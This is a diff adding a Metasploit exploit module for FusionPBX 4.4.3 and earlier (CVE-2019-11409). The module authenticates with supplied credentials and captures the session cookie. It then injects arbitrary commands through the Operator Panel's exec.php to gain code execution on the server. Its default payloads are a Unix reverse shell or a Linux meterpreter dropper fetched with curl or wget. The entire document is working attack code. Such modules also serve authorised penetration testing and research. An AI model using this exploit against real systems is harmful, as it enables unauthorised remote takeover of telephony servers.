@@ -1,0 +1,164 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'FusionPBX Operator Panel exec.php Command Execution',
+      'Description'     => %q{
+        This module exploits an authenticated command injection vulnerability
+        in FusionPBX versions 4.4.3 and prior.
+
+        The `exec.php` file within the Operator Panel permits users with
+        `operator_panel_view` permissions, or administrator permissions,
+        to execute arbitrary commands as the web server user by sending
+        a `system` command to the FreeSWITCH event socket interface.
+
+        This module has been tested successfully on FusionPBX version
+        4.4.1 on Ubuntu 19.04 (x64).
+      },
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Dustin Cobb', # Discovery and exploit
+          'bcoles'       # Metasploit
+        ],
+      'References'      =>
+        [
+          ['CVE', '2019-11409'],
+          ['EDB', '46985'],
+          ['URL', 'https://blog.gdssecurity.com/labs/2019/6/7/rce-using-caller-id-multiple-vulnerabilities-in-fusionpbx.html'],
+          ['URL', 'https://github.com/fusionpbx/fusionpbx/commit/e43ca27ba2d9c0109a6bf198fe2f8d79f63e0611']
+        ],
+      'Platform'        => %w[unix linux],
+      'Arch'            => [ARCH_CMD, ARCH_X86, ARCH_X64],
+      'Payload'         => {'BadChars' => "\x00\x0a\x0d\x27\x5c"},
+      'CmdStagerFlavor' => %w[curl wget],
+      'Targets'         =>
+        [
+          ['Automatic (Unix In-Memory)',
+            'Platform'       => 'unix',
+            'Arch'           => ARCH_CMD,
+            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse'},
+            'Type'           => :unix_memory
+          ],
+          ['Automatic (Linux Dropper)',
+            'Platform'       => 'linux',
+            'Arch'           => [ARCH_X86, ARCH_X64],
+            'DefaultOptions' => {'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'},
+            'Type'           => :linux_dropper
+          ]
+        ],
+      'Privileged'      => false,
+      'DefaultOptions'  => { 'SSL' => true, 'RPORT' => 443 },
+      'DisclosureDate'  => '2019-06-06',
+      'DefaultTarget'   => 0))
+    register_options [
+      OptString.new('TARGETURI', [true, 'The base path to FusionPBX', '/']),
+      OptString.new('USERNAME', [true, 'The username for FusionPBX']),
+      OptString.new('PASSWORD', [true, 'The password for FusionPBX'])
+    ]
+  end
+
+  def login(user, pass)
+    vprint_status "Authenticating as user '#{user}'"
+
+    vars_post = {
+      username: user,
+      password: pass,
+      path: ''
+    }
+
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, 'core/user_settings/user_dashboard.php'),
+      'vars_post' => vars_post
+    })
+
+    unless res
+      fail_with Failure::Unreachable, 'Connection failed'
+    end
+
+    if res.code == 302 && res.headers['location'].include?('login.php')
+      fail_with Failure::NoAccess, "Login failed for user '#{user}'"
+    end
+
+    unless res.code == 200
+      fail_with Failure::UnexpectedReply, "Unexpected HTTP response status code #{res.code}"
+    end
+
+    cookie = res.get_cookies.to_s.scan(/PHPSESSID=(.+?);/).flatten.first
+
+    unless cookie
+      fail_with Failure::UnexpectedReply, 'Failed to retrieve PHPSESSID cookie'
+    end
+
+    print_good "Authenticated as user '#{user}'"
+
+    cookie
+  end
+
+  def check
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path)
+    })
+
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Unknown
+    end
+
+    if res.body.include?('FusionPBX')
+      return CheckCode::Detected
+    end
+
+    CheckCode::Safe
+  end
+
+  def execute_command(cmd, opts = {})
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'app/operator_panel/exec.php'),
+      'cookie'  => "PHPSESSID=#{@cookie}",
+      'vars_get' => {'cmd' => "bg_system #{cmd}"}
+    }, 5)
+
+    unless res
+      return if session_created?
+      fail_with Failure::Unreachable, 'Connection failed'
+    end
+
+    unless res.code == 200
+      fail_with Failure::UnexpectedReply, "Unexpected HTTP response status code #{res.code}"
+    end
+
+    if res.body.include? 'access denied'
+      fail_with Failure::NoAccess, "User #{datastore['USERNAME']} does not have permission to access the Operator Panel"
+    end
+
+    res
+  end
+
+  def exploit
+    unless check == CheckCode::Detected
+      fail_with Failure::NotVulnerable, "#{peer} - Target is not vulnerable"
+    end
+
+    @cookie = login(datastore['USERNAME'], datastore['PASSWORD'])
+
+    print_status "Sending payload (#{payload.encoded.length} bytes) ..."
+
+    case target['Type']
+    when :unix_memory
+      execute_command(payload.encoded)
+    when :linux_dropper
+      execute_cmdstager(:linemax => 1_500)
+    end
+  end
+end
